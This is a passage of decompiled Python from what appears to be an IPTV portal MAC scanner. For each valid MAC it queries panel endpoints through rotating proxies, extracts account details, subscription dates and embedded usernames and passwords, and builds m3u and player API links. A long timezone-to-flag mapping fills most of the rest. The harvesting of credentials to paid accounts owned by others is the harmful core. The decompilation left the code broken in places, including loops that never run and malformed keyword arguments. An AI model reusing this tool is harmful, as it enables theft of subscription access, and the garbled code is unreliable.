            country = country.replace('TF', 'French Southern Territories 🇹🇫')
            country = country.replace('VA', 'Vatican City State 🇻🇦')
            country = country.replace('AQ', 'Antarctica 🇦🇶')
            settings_password = str(duzel2(veri, 'settings_password'))
            expire_billing_date = str(duzel2(veri, 'expire_billing_date'))
            ls = str(duzel2(veri, 'ls'))
            
            try:
                max_online = str(duzel2(veri, 'max_online'))
            except:
                pass

        url = http + '://' + panel + '/' + uzmanm + '?type=account_info&action=get_main_info&JsHttpRequest=1-xml'
        veri = ''
        while None:
            
            try:
                res = ses.get(url, hea2(mac, token), prox, 3, **('headers', 'proxies', 'timeout'))
            except:
                prox = proxygetir()

        veri = str(res.text)
        if veri.count('phone') == 0 and veri.count('end_date') == 0 and expires == '' and expire_billing_date == '':
            continue
            ses.close
            res.close
        fname = ''
        tariff_plan = ''
        ls = ''
        trh = ''
        bill = ''
        if uzmanm == 'stalker_portal/server/load.php':
            
            try:
                fname = str(duzel2(veri, 'fname'))
            except:
                pass

            
            try:
                tariff_plan = str(duzel2(veri, 'tariff_plan'))
            except:
                pass

            
            try:
                bill = str(duzel2(veri, 'created'))
            except:
                pass

        if 'phone' in veri:
            trh = str(duzel2(veri, 'phone'))
        if 'end_date' in veri:
            trh = str(duzel2(veri, 'end_date'))
        if not trh == '' and expires == '':
            trh = expires
        
        try:
            trh = datetime.datetime.fromtimestamp(int(trh)).strftime('%d.%b.%Y')
        except:
            pass

        if '(-' in trh:
            continue
            ses.close
            res.close
        if trh.lower()[:2] == 'un':
            KalanGun = ' Days'
        else:
            
            try:
                KalanGun = str(tarih_clear(trh)) + ' Days'
                trh = str(trh)
                ayy = str(trh.split(' ')[0])
                guny = str(trh.split(', ')[0].split(' ')[1])
                yily = str(trh.split(', ')[1])
                traiy = str(guny) + '.' + str(ayy) + '.' + str(yily)
                trh = str(traiy)
                trh = trh + ' (' + KalanGun + ')'
            except:
                pass

        if trh == '' and uzmanm == 'stalker_portal/server/load.php':
            trh = expire_billing_date
        veri = ''
        cid = '1842'
        url = http + '://' + panel + '/' + uzmanm + '?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml'
        bad = 0
        while None:
            
            try:
                res = ses.get(url, hea2(mac, token), proxygetir(), 3, **('headers', 'proxies', 'timeout'))
                veri = str(res.text)
                if 'total' in veri:
                    cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                if uzmanm == 'stalker_portal/server/load.php':
                    cid = str(res.text).split('id":"')[5].split('"')[0]
            except:
                pass

        user = ''
        pas = ''
        link = ''
        real = panel
        if not expires == '':
            veri = ''
            cmd = ''
            url = http + '://' + panel + '/' + uzmanm + '?action=get_ordered_list&type=vod&p=1&JsHttpRequest=1-xml'
            while None:
                
                try:
                    res = ses.get(url, hea2(mac, token), proxygetir(), 3, **('headers', 'proxies', 'timeout'))
                    veri = str(res.text)
                except:
                    pass

            if 'cmd' not in veri:
                continue
            cmd = duzel2(veri, 'cmd')
            veri = ''
            url = http + '://' + panel + '/' + uzmanm + '?type=vod&action=create_link&cmd=' + str(cmd) + '&series=&forced_storage=&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml'
            while None:
                
                try:
                    res = ses.get(url, hea2(mac, token), proxygetir(), 3, **('headers', 'proxies', 'timeout'))
                    veri = str(res.text)
                except:
                    pass

            if 'cmd":"' in veri:
                link = veri.split('cmd":"')[1].split('"')[0].replace('\\/', '/')
                user = str(link.replace('movie/', '').split('/')[3])
                real = http + '://' + link.split('://')[1].split('/')[0] + '/c/'
                pas = str(link.replace('movie/', '').split('/')[4])
                cid = duzel2(veri, 'id')
                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
        hitecho(mac, trh)
        hit = hit + 1
        hitr = '\33[1;36m'
        veri = ''
        if user == '':
            while None:
                
                try:
                    res = ses.get(url7(cid), hea2(mac, token), proxygetir(), 3, False, **('headers', 'proxies', 'timeout', 'verify'))
                    veri = str(res.text)
                    if 'ffmpeg ' in veri:
                        link = veri.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                    elif 'cmd":"' in veri:
                        link = veri.split('cmd":"')[1].split('"')[0].replace('\\/', '/')
                        user = login
                        pas = password
                        real = 'http://' + link.split('://')[1].split('/')[0] + '/c/'
                    if 'ffmpeg ' in veri:
                        user = str(link.replace('live/', '').split('/')[3])
                        pas = str(link.replace('live/', '').split('/')[4])
                        if real == panel:
                            real = 'http://' + link.split('://')[1].split('/')[0] + '/c/'
                    m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                except:
                    pass

        durum = ''
        if not link == '':
            
            try:
                durum = goruntu(link, cid)
            except:
                pass

        if not m3ulink == '':
            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
            plink = real.replace('http://', '').replace('/c/', '')
            playerapi = m3uapi(playerlink, mac, token)
            m3uimage = m3ugoruntu(cid, user, pas, plink)
            if playerapi == '':
                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                plink = panel.replace('http://', '').replace('/c/', '')
                playerapi = m3uapi(playerlink, mac, token)
                m3uimage = m3ugoruntu(cid, user, pas, plink)
        if m3uimage == 'ᴏꜰꜰʟɪɴᴇ😔':
            m3uvpn = m3uvpn + 1
        else:
            m3uon = m3uon + 1
        if durum == 'ᴍᴀᴄ ᴏꜰꜰ🥺' or durum == 'INVALID OPPS':
            macvpn = macvpn + 1
        else:
            macon = macon + 1
        vpn = ''
        if not ip == '':
            vpn = vpnip(ip)
        else:
            vpn = 'ᴀɴᴏɴʏᴍᴏᴜꜱ'
        url5 = ''
        pal = panel
        pal = pal.split(':', 1)[0]
        url5 = 'https://iplist.cc/api/' + pal
        while None:
            
            try:
                res = ses.get(url5, 15, False, **('timeout', 'verify'))
            except:
                bag1 = 0
                bag1 = bag1 + 1
                time.sleep(bekleme)
                if bag1 == 4:
                    break

        
        try:
            bag1 = 0
            servreg = ''
            sname = ''
            sip = ''
            veri = str(res.text)
            if 'title' not in veri:
                sip = veri.split('ip": "')[1]
                sip = sip.split('"')[0]
                servreg = veri.split('registry": "')[1]
                servreg = servreg.split('"')[0]
                sname = veri.split('"name": "')[1]
                sname = sname.split('"')[0]
                scode = veri.split('"code": "')[1]
                scode = scode.split('"')[0]
                scount = veri.split('"count": "')[1]
                scount = scount.split('"')[0]
        except:
            pass

        url6 = 'https://iplist.cc/api/' + sip
        while None:
            
            try:
                res = ses.get(url6, 15, False, **('timeout', 'verify'))
            except:
                bag1 = bag1 + 1
                time.sleep(bekleme)
                if bag1 == 4:
                    break

        
        try:
            bag1 = 0
            veri = str(res.text)
            scountry = ''
            if 'title' not in veri:
                country_name = veri.split('countryname": "')[1]
                country_name = str(country_name.split('"')[0].encode('utf-8').decode('unicode-escape'))
                scountry = veri.split('countrycode": "')[1]
                scountry = scountry.split('"')[0]
        finally:
            pass

        ypal = panel
        if 'http://' in ypal:
            ypal = ypal.split('://')[1]
            ypal = ypal.split('/')[0]
        ypal = ypal.replace('/c/', '')
        ypal = ypal.replace('/c', '')
        ypal = ypal.replace('/', '')
        yport = ''
        if ':' in ypal:
            yport = ypal.split(':')[1]
            ypal = ypal.split(':')[0]
        yanpan = ypal
        if yport == '':
            yport = 80
        url = 'https://iplist.cc/api/' + ypal
        res = str(ses.get(url, 2, **('timeout',)).text)
        if '"Cloudflarenet"' not in res and '"Centurylink-legacy-lvlt-203"' not in res:
            veri = res.split('[')[1].split(']')[0]
            yanpan = veri.replace(' ', '').replace('"', '').replace('\n', '')
        yanpan = 'http://' + str(yanpan).replace(',', ' \n┣❖http://')
        yanpan = yanpan.replace('http://', 'http://')
        if not yport == '':
            yanpan = yanpan.replace(' \n', ':' + str(yport) + '/c/ \n')
        urlkasay = ''
        urlfsay = ''
        urldsay = ''
        livelist = ''
        vodlist = ''
        serieslist = ''
        
        try:
            urlksay = 'http://' + panel + '/player_api.php?username=' + user + '&password=' + pas + '&action=get_live_streams'
            res = ses.get(urlksay, 15, False, **('timeout', 'verify'))
            veri = str(res.text)
            kanalsayisi = str(veri.count('stream_id'))
            urlfsay = 'http://' + panel + '/player_api.php?username=' + user + '&password=' + pas + '&action=get_vod_streams'
            res = ses.get(urlfsay, 15, False, **('timeout', 'verify'))
            veri = str(res.text)
            filmsayisi = str(veri.count('stream_id'))
            urldsay = 'http://' + panel + '/player_api.php?username=' + user + '&password=' + pas + '&action=get_series'
            res = ses.get(urldsay, 15, False, **('timeout', 'verify'))
            veri = str(res.text)
            dizisayisi = str(veri.count('series_id'))
        except:
            pass

        liveurl = http + '://' + panel + '/' + uzmanm + '?action=get_genres&type=itv&JsHttpRequest=1-xml'
        if not expires == '':
            liveurl = http + '://' + panel + '/' + uzmanm + '?type=itv&action=get_genres&JsHttpRequest=1-xml'
        if uzmanm == 'stalker_portal/server/load.php':
            liveurl = http + '://' + panel + '/' + uzmanm + '?type=itv&action=get_genres&JsHttpRequest=1-xml'
        vodurl = http + '://' + panel + '/' + uzmanm + '?action=get_categories&type=vod&JsHttpRequest=1-xml'
        seriesurl = http + '://' + panel + '/' + uzmanm + '?action=get_categories&type=series&JsHttpRequest=1-xml'
        if kanalkata == '1' or kanalkata == '2':
            listlink = liveurl
            livel = '««◌»»'
            livelist = list(listlink, mac, token, livel)
        if kanalkata == '2':
            listlink = vodurl
            livel = '««◌»»'
            vodlist = list(listlink, mac, token, livel)
            listlink = seriesurl
            livel = '««◌»»'
            serieslist = list(listlink, mac, token, livel)
        hityaz(mac, trh, real, m3ulink, m3uimage, durum, vpn, livelist, vodlist, serieslist, playerapi, fname, tariff_plan, ls, login, password, tariff_plan_id, bill, expire_billing_date, max_online, parent_password, stb_type, comment, country, settings_password, kanalsayisi, filmsayisi, dizisayisi, ip, sip, servreg, sname, country_name, scountry, yport, yanpan, m3uinfo)
    


def vpnip(ip):
    url9 = 'https://ipleak.net/json/' + ip
    vpnip = ''
    vcountry = ''
    vpn = 'No Client IP Address'
    veri = ''
    
    try:
        res = ses.get(url9, 7, False, **('timeout', 'verify'))
        veri = str(res.text)
    finally:
        pass

    vpn = 'No Client IP Address'
    if '404 page' not in veri:
        if 'country_name' in veri:
            vpnc = veri.split('city_name": "')[-1]
            vpnc = str(vpnc.split('"')[0].encode('utf-8').decode('unicode-escape'))
            vpnips = veri.split('country_name": "')[1]
            vpnips = vpnips.split('"')[0]
            vcountry = veri.split('country_code": "')[1]
            vcountry = vcountry.split('"')[0]
            vpncont = veri.split('continent_name": "')[1]
            vpncont = vpncont.split('"')[0]
            vpnreg = veri.split('region_name": "')[-1]
            vpnreg = str(vpnreg.split('"')[0].encode('utf-8').decode('unicode-escape'))
            clisp = veri.split('isp_name": "')[1]
            clisp = str(clisp.split('"')[0].encode('utf-8').decode('unicode-escape'))
            vpntz = veri.split('time_zone": "')[1]
            vpntz = vpntz.split('"')[0]
            vpntz = vpntz.replace('\\/', '/')
            vpntz = vpntz.replace('UTC', 'Universal Time Coordinated 🌍')
            vpntz = vpntz.replace('Europe/Andorra', 'Europe/Andorra 🇦🇩')
            vpntz = vpntz.replace('Asia/Dubai', 'Asia/Dubai 🇦🇪 United Arab Emirates')
            vpntz = vpntz.replace('Asia/Kabul', 'Asia/Kabul 🇦🇫 Afghanistan')
            vpntz = vpntz.replace('America/Antigua', 'America/Antigua and Barbuda 🇦🇬')
            vpntz = vpntz.replace('America/Anguilla', 'America/Anguilla 🇦🇮')
            vpntz = vpntz.replace('Europe/Tirane', 'Europe/Tirane 🇦🇱 Albania')
            vpntz = vpntz.replace('Asia/Yerevan', 'Asia/Yerevan 🇦🇲 Armenia')
            vpntz = vpntz.replace('Africa/Luanda', 'Africa/Luanda 🇦🇴 Angola')
            vpntz = vpntz.replace('Antarctica/McMurdo', 'Antarctica/McMurdo 🇦🇶')
            vpntz = vpntz.replace('Antarctica/South_Pole', 'Antarctica/South Pole 🇦🇶')
            vpntz = vpntz.replace('Antarctica/Rothera', 'Antarctica/Rothera 🇦🇶')
            vpntz = vpntz.replace('Antarctica/Palmer', 'Antarctica/Palmer 🇦🇶')
            vpntz = vpntz.replace('Antarctica/Mawson', 'Antarctica/Mawson 🇦🇶')
            vpntz = vpntz.replace('Antarctica/Davis', 'Antarctica/Davis 🇦🇶')
            vpntz = vpntz.replace('Antarctica/Casey', 'Antarctica/Casey 🇦🇶')
            vpntz = vpntz.replace('Antarctica/Vostok', 'Antarctica/Vostok 🇦🇶')
            vpntz = vpntz.replace('Antarctica/DumontDUrville', 'Antarctica/DumontDUrville 🇦🇶')
            vpntz = vpntz.replace('Antarctica/Syowa', 'Antarctica/Syowa 🇦🇶')
            vpntz = vpntz.replace('Antarctica/Macquarie', 'Antarctica/Macquarie 🇦🇶')
            vpntz = vpntz.replace('America/Argentina/Buenos_Aires', 'America/Buenos Aires 🇦🇷 Argentina')
            vpntz = vpntz.replace('America/Argentina/Cordoba', 'America/Cordoba 🇦🇷 Argentina')
            vpntz = vpntz.replace('America/Argentina/Salta', 'America/Salta 🇦🇷 Argentina')
            vpntz = vpntz.replace('America/Argentina/Jujuy', 'America/Jujuy 🇦🇷 Argentina')
            vpntz = vpntz.replace('America/Argentina/Tucuman', 'America/Tucuman 🇦🇷 Argentina')
            vpntz = vpntz.replace('America/Argentina/Catamarca', 'America/Catamarca 🇦🇷 Argentina')
            vpntz = vpntz.replace('America/Argentina/La_Rioja', 'America/La Rioja 🇦🇷 Argentina')
            vpntz = vpntz.replace('America/Argentina/San_Juan', 'America/San Juan 🇦🇷 Argentina')
            vpntz = vpntz.replace('America/Argentina/Mendoza', 'America/Mendoza 🇦🇷 Argentina')
            vpntz = vpntz.replace('America/Argentina/San_Luis', 'America/San Luis 🇦🇷 Argentina')
            vpntz = vpntz.replace('America/Argentina/Rio_Gallegos', 'America/Rio Gallegos 🇦🇷 Argentina')
            vpntz = vpntz.replace('America/Argentina/Ushuaia', 'America/Ushuaia 🇦🇷 Argentina')
            vpntz = vpntz.replace('Pacific/Pago_Pago', 'Pacific/Pago Pago 🇦🇸 American Samoa')
            vpntz = vpntz.replace('Europe/Vienna', 'Europe/Vienna 🇦🇹 Austria')
            vpntz = vpntz.replace('Australia/Lord_Howe', 'Australia/Lord Howe 🇦🇺 Australia')
            vpntz = vpntz.replace('Australia/Hobart', 'Australia/Hobart 🇦🇺 Australia')
            vpntz = vpntz.replace('Australia/Currie', 'Australia/Currie 🇦🇺 Australia')
            vpntz = vpntz.replace('Australia/Melbourne', 'Australia/Melbourne 🇦🇺 Australia')
            vpntz = vpntz.replace('Australia/Sydney', 'Australia/Sydney 🇦🇺 Australia')
            vpntz = vpntz.replace('Australia/Broken_Hill', 'Australia/Broken Hill 🇦🇺 Australia')
            vpntz = vpntz.replace('Australia/Brisbane', 'Australia/Brisbane 🇦🇺 Australia')
            vpntz = vpntz.replace('Australia/Lindeman', 'Australia/Lindeman 🇦?? Australia')
            vpntz = vpntz.replace('Australia/Adelaide', 'Australia/Adelaide 🇦🇺 Australia')
            vpntz = vpntz.replace('Australia/Darwin', 'Australia/Darwin 🇦🇺 Australia')
            vpntz = vpntz.replace('Australia/Perth', 'Australia/Perth 🇦🇺 Australia')
            vpntz = vpntz.replace('Australia/Eucla', 'Australia/Eucla 🇦🇺 Australia')
            vpntz = vpntz.replace('America/Aruba', 'America/Aruba 🇦🇼')
            vpntz = vpntz.replace('Europe/Mariehamn', 'Europe/Mariehamn 🇦🇽 Åland Islands')
            vpntz = vpntz.replace('Asia/Baku', 'Asia/Baku 🇦🇿 Azerbaijan')
            vpntz = vpntz.replace('Europe/Sarajevo', 'Europe/Sarajevo 🇧🇦 Bosnia and Herzegovina')
            vpntz = vpntz.replace('America/Barbados', 'America/Barbados 🇧🇧')
            vpntz = vpntz.replace('Asia/Dhaka', 'Asia/Dhaka 🇧🇩 Bangladesh')
            vpntz = vpntz.replace('Europe/Brussels', 'Europe/Brussels 🇧🇪 Belgium')
            vpntz = vpntz.replace('Africa/Ouagadougou', 'Africa/Ouagadougou 🇧🇫 Burkina Faso')
            vpntz = vpntz.replace('Europe/Sofia', 'Europe/Sofia 🇧🇬 Bulgaria')
            vpntz = vpntz.replace('Asia/Bahrain', 'Asia/Bahrain 🇧🇾')
            vpntz = vpntz.replace('Africa/Bujumbura', 'Africa/Bujumbura 🇧🇮 Burundi')
            vpntz = vpntz.replace('Africa/Porto', 'Africa/Porto-Novo 🇧🇯 Benin')
            vpntz = vpntz.replace('America/St_Barthelemy', 'America/Saint Barthélemy 🇧🇱')
            vpntz = vpntz.replace('Atlantic/Bermuda', 'Atlantic/Bermuda 🇧🇲')
            vpntz = vpntz.replace('Asia/Brunei', 'Asia/Brunei 🇧🇳')
            vpntz = vpntz.replace('America/La_Paz', 'America/La Paz 🇧🇴 Bolivia')
            vpntz = vpntz.replace('America/Kralendijk', 'America/Kralendijk 🇧🇶 Bonaire')
            vpntz = vpntz.replace('America/Noronha', 'America/Noronha 🇧🇷 Brazil')
            vpntz = vpntz.replace('America/Belem', 'America/Belém 🇧🇷 Brazil')
            vpntz = vpntz.replace('America/Fortaleza', 'America/Fortaleza 🇧🇷 Brazil')
            vpntz = vpntz.replace('America/Recife', 'America/Recife 🇧🇷 Brazil')
            vpntz = vpntz.replace('America/Araguaina', 'America/Araguaína 🇧🇷 Brazil')
            vpntz = vpntz.replace('America/Maceio', 'America/Maceió 🇧🇷 Brazil')
            vpntz = vpntz.replace('America/Bahia', 'America/Bahia 🇧🇷 Brazil')
            vpntz = vpntz.replace('America/Sao_Paulo', 'America/São Paulo 🇧🇷 Brazil')
            vpntz = vpntz.replace('America/Campo_Grande', 'America/Campo Grande 🇧🇷 Brazil')
            vpntz = vpntz.replace('America/Cuiaba', 'America/Cuiabá 🇧🇷 Brazil')
            vpntz = vpntz.replace('America/Santarem', 'America/Santarém 🇧🇷 Brazil')
            vpntz = vpntz.replace('America/Porto_Velho', 'America/Porto Velho 🇧🇷 Brazil')
            vpntz = vpntz.replace('America/Boa_Vista', 'America/Boa Vista 🇧🇷 Brazil')
            vpntz = vpntz.replace('America/Manaus', 'America/Manaus 🇧🇷 Brazil')
            vpntz = vpntz.replace('America/Eirunepe', 'America/Eirunepé 🇧🇷 Brazil')
            vpntz = vpntz.replace('America/Rio_Branco', 'America/Rio Branco 🇧🇷 Brazil')
            vpntz = vpntz.replace('America/Nassau', 'America/Nassau 🇧🇸 Bahamas')
            vpntz = vpntz.replace('Asia/Thimphu', 'Asia/Thimphu 🇧🇹 Bhutan')
            vpntz = vpntz.replace('Africa/Gaborone', 'Africa/Gaborone 🇧🇼 Botswana')
            vpntz = vpntz.replace('Europe/Minsk', 'Europe/Minsk 🇧🇾 Belarus')
            vpntz = vpntz.replace('America/Belize', 'America/Belize 🇧🇿')
            vpntz = vpntz.replace('America/St_Johns', 'America/Saint Johns 🇦🇬 Antigua and Barbuda')
            vpntz = vpntz.replace('America/Halifax', 'America/Halifax 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Glace_Bay', 'America/Glace Bay 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Moncton', 'America/Moncton 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Goose_Bay', 'America/Goose Bay 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Blanc', 'America/Blanc 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Montreal', 'America/Montreal 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Toronto', 'America/Toronto 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Nipigon', 'America/Nipigon 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Thunder_Bay', 'America/Thunder Bay 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Iqaluit', 'America/Iqaluit 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Pangnirtung', 'America/Pangnirtung 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Resolute', 'America/Resolute 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Atikokan', 'America/Atikokan 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Rankin_Inlet', 'America/Rankin Inlet 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Winnipeg', 'America/Winnipeg 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Rainy_River', 'America/Rainy River 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Regina', 'America/Regina 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Swift_Current', 'America/Swift Current 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Edmonton', 'America/Edmonton 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Cambridge_Bay', 'America/Cambridge Bay 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Yellowknife', 'America/Yellowknife 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Inuvik', 'America/Inuvik 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Creston', 'America/Creston 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Dawson_Creek', 'America/Dawson Creek 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Vancouver', 'America/Vancouver 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Whitehorse', 'America/Whitehorse 🇨🇦 Canada')
            vpntz = vpntz.replace('America/Dawson', 'America/Dawson 🇨🇦 Canada')
            vpntz = vpntz.replace('Indian/Cocos', 'Indian/Cocos Islands 🇨🇨')
            vpntz = vpntz.replace('Africa/Kinshasa', 'Africa/Kinshasa 🇨🇩 Democratic Republic of the Congo')
            vpntz = vpntz.replace('Africa/Lubumbashi', 'Africa/Lubumbashi 🇨🇩 Democratic Republic of the Congo')
            vpntz = vpntz.replace('Africa/Brazzaville', 'Africa/Brazzaville 🇨🇩 Democratic Republic of the Congo')
            vpntz = vpntz.replace('Africa/Bangui', 'Africa/Bangui 🇨🇫 Central African Republic')
            vpntz = vpntz.replace('Europe/Zurich', 'Europe/Zurich 🇨🇭 Switzerland')
            vpntz = vpntz.replace('Africa/Abidjan', "Africa/Abidjan 🇨🇮 Côte d'Ivoire")
            vpntz = vpntz.replace('Pacific/Rarotonga', 'Pacific/Rarotonga 🇨🇰 Cook Islands')
            vpntz = vpntz.replace('America/Santiago', 'America/Santiago 🇨🇱 Chile')
            vpntz = vpntz.replace('Pacific/Easter', 'Pacific/Easter Island 🇨🇱 Chile')
            vpntz = vpntz.replace('Africa/Douala', 'Africa/Douala 🇨🇲 Cameroon')
            vpntz = vpntz.replace('Asia/Shanghai', 'Asia/Shanghai 🇨🇳 China')
            vpntz = vpntz.replace('Asia/Harbin', 'Asia/Harbin 🇨🇳 China')
            vpntz = vpntz.replace('Asia/Chongqing', 'Asia/Chongqing 🇨🇳 China')
            vpntz = vpntz.replace('Asia/Urumqi', 'Asia/Urumqi 🇨🇳 China')
            vpntz = vpntz.replace('Asia/Kashgar', 'Asia/Kashgar 🇨🇳 China')
            vpntz = vpntz.replace('America/Bogota', 'America/Bogota 🇨🇴 Colombia')
            vpntz = vpntz.replace('America/Costa_Rica', 'America/Costa Rica 🇨🇷')
            vpntz = vpntz.replace('America/Havana', 'America/Havana 🇨🇺 Cuba')
            vpntz = vpntz.replace('Atlantic/Cape_Verde', 'Atlantic/Cape Verde 🇨🇻')
            vpntz = vpntz.replace('America/Curacao', 'America/Curacao 🇨🇼')
            vpntz = vpntz.replace('Indian/Christmas', 'Indian/Christmas Island 🇨🇽')
            vpntz = vpntz.replace('Asia/Nicosia', 'Asia/Nicosia 🇨🇾 Cyprus')
            vpntz = vpntz.replace('Europe/Prague', 'Europe/Prague 🇨🇿 Czech Republic')
            vpntz = vpntz.replace('Europe/Berlin', 'Europe/Berlin 🇩🇪 Germany')
            vpntz = vpntz.replace('Africa/Djibouti', 'Africa/Djibouti 🇩🇯')
            vpntz = vpntz.replace('Europe/Copenhagen', 'Europe/Copenhagen 🇩🇰 Denmark')
            vpntz = vpntz.replace('America/Dominica', 'America/Dominica 🇩🇲')
            vpntz = vpntz.replace('America/Santo_Domingo', 'America/Santo Domingo 🇩🇴 Dominican Republic')
            vpntz = vpntz.replace('Africa/Algiers', 'Africa/Algiers 🇩🇿 Algeria')
            vpntz = vpntz.replace('America/Guayaquil', 'America/Guayaquil 🇪🇨 Ecuador')
            vpntz = vpntz.replace('Pacific/Galapagos', 'Pacific/Galápagos Islands 🇪🇨 Ecuador')
            vpntz = vpntz.replace('Europe/Tallinn', 'Europe/Tallinn 🇪🇪 Estonia')
            vpntz = vpntz.replace('Africa/Cairo', 'Africa/Cairo 🇪🇬 Egypt')
            vpntz = vpntz.replace('Africa/El_Aaiun', 'Africa/El Aaiun 🇪🇭 Western Sahara')
            vpntz = vpntz.replace('Africa/Asmara', 'Africa/Asmara 🇪🇷 Eritrea')
            vpntz = vpntz.replace('Europe/Madrid', 'Europe/Madrid 🇪🇸 Spain')
            vpntz = vpntz.replace('Africa/Ceuta', 'Africa/Ceuta 🇪🇸 Spain')
            vpntz = vpntz.replace('Atlantic/Canary', 'Atlantic/Canary Islands 🇪🇸 Spain')
            vpntz = vpntz.replace('Africa/Addis_Ababa', 'Africa/Addis Ababa 🇪🇹 Ethiopia')
            vpntz = vpntz.replace('Europe/Helsinki', 'Europe/Helsinki 🇫🇮 Finland')
            vpntz = vpntz.replace('Pacific/Fiji', 'Pacific/Fiji 🇫🇯')
            vpntz = vpntz.replace('Atlantic/Stanley', 'Atlantic/Stanley 🇫🇰 Falkland Islands')
            vpntz = vpntz.replace('Pacific/Chuuk', 'Pacific/Chuuk 🇫🇲 Micronesia')
            vpntz = vpntz.replace('Pacific/Pohnpei', 'Pacific/Pohnpei 🇫🇲 Micronesia')
            vpntz = vpntz.replace('Pacific/Kosrae', 'Pacific/Kosrae 🇫🇲 Micronesia')
            vpntz = vpntz.replace('Atlantic/Faroe', 'Atlantic/Faroe Islands 🇫🇴')
            vpntz = vpntz.replace('Europe/Paris', 'Europe/Paris 🇫🇷 France')
            vpntz = vpntz.replace('Africa/Libreville', 'Africa/Libreville 🇬🇦 Gabon')
            vpntz = vpntz.replace('Europe/London', 'Europe/London 🇬🇧 Great Britain')
            vpntz = vpntz.replace('America/Grenada', 'America/Grenada 🇬🇩')
            vpntz = vpntz.replace('Asia/Tbilisi', 'Asia/Tbilisi 🇬🇪 Georgia')
            vpntz = vpntz.replace('America/Cayenne', 'America/Cayenne 🇬🇫 French Guiana')
            vpntz = vpntz.replace('Europe/Guernsey', 'Europe/Guernsey 🇬🇬')
            vpntz = vpntz.replace('Africa/Accra', 'Africa/Accra 🇬🇭 Ghana')
            vpntz = vpntz.replace('Europe/Gibraltar', 'Europe/Gibraltar 🇬🇮')
            vpntz = vpntz.replace('America/Godthab', 'America/Godthab 🇬🇱 Greenland')
            vpntz = vpntz.replace('America/Danmarkshavn', 'America/Danmarkshavn 🇬🇱 Greenland')
            vpntz = vpntz.replace('America/Scoresbysund', 'America/Scoresbysund 🇬🇱 Greenland')
            vpntz = vpntz.replace('America/Thule', 'America/Thule 🇬🇱 Greenland')
            vpntz = vpntz.replace('Africa/Banjul', 'Africa/Banjul 🇬🇲 Gambia')
            vpntz = vpntz.replace('Africa/Conakry', 'Africa/Conakry 🇬🇳 Guinea')
            vpntz = vpntz.replace('America/Guadeloupe', 'America/Guadeloupe 🇬🇵')
            vpntz = vpntz.replace('Africa/Malabo', 'Africa/Malabo 🇬🇶 Equatorial Guinea')
            vpntz = vpntz.replace('Europe/Athens', 'Europe/Athens 🇬🇷 Greece')
            vpntz = vpntz.replace('Atlantic/South_Georgia', 'Atlantic/South Georgia and the South Sandwich Islands 🇬🇸')
            vpntz = vpntz.replace('America/Guatemala', 'America/Guatemala 🇬🇹')
            vpntz = vpntz.replace('Pacific/Guam', 'Pacific/Guam 🇬🇺')
            vpntz = vpntz.replace('Africa/Bissau', 'Africa/Bissau 🇬🇼 Guinea-Bissau')
            vpntz = vpntz.replace('America/Guyana', 'America/Guyana 🇬🇾')
            vpntz = vpntz.replace('Asia/Hong_Kong', 'Asia/Hong Kong 🇭🇰')
            vpntz = vpntz.replace('America/Tegucigalpa', 'America/Tegucigalpa 🇭🇳 Honduras')
            vpntz = vpntz.replace('Europe/Zagreb', 'Europe/Zagreb 🇭🇷 Croatia')
            vpntz = vpntz.replace('America/Port', 'America/Port-au-Prince 🇭🇹 Haiti')
            vpntz = vpntz.replace('Europe/Budapest', 'Europe/Budapest 🇭🇺 Hungary')
            vpntz = vpntz.replace('Asia/Jakarta', 'Asia/Jakarta 🇮🇩 Indonesia')
            vpntz = vpntz.replace('Asia/Pontianak', 'Asia/Pontianak 🇮🇩 Indonesia')
            vpntz = vpntz.replace('Asia/Makassar', 'Asia/Makassar 🇮🇩 Indonesia')
            vpntz = vpntz.replace('Asia/Jayapura', 'Asia/Jayapura 🇮🇩 Indonesia')
            vpntz = vpntz.replace('Europe/Dublin', 'Europe/Dublin ??🇪 Ireland')
            vpntz = vpntz.replace('Asia/Jerusalem', 'Asia/Jerusalem 🇮🇱 Israel')
            vpntz = vpntz.replace('Europe/Isle_of_Man', 'Europe/Isle of Man 🇮🇲')
            vpntz = vpntz.replace('Asia/Kolkata', 'Asia/Kolkata 🇮🇳 India')
            vpntz = vpntz.replace('Indian/Chagos', 'Indian/Chagos 🇮🇴 British Indian Ocean Territory')
            vpntz = vpntz.replace('Asia/Baghdad', 'Asia/Baghdad 🇮🇶 Iraq')
            vpntz = vpntz.replace('Asia/Tehran', 'Asia/Tehran 🇮🇷 Iran')
            vpntz = vpntz.replace('Atlantic/Reykjavik', 'Atlantic/Reykjavik 🇮🇸 Iceland')
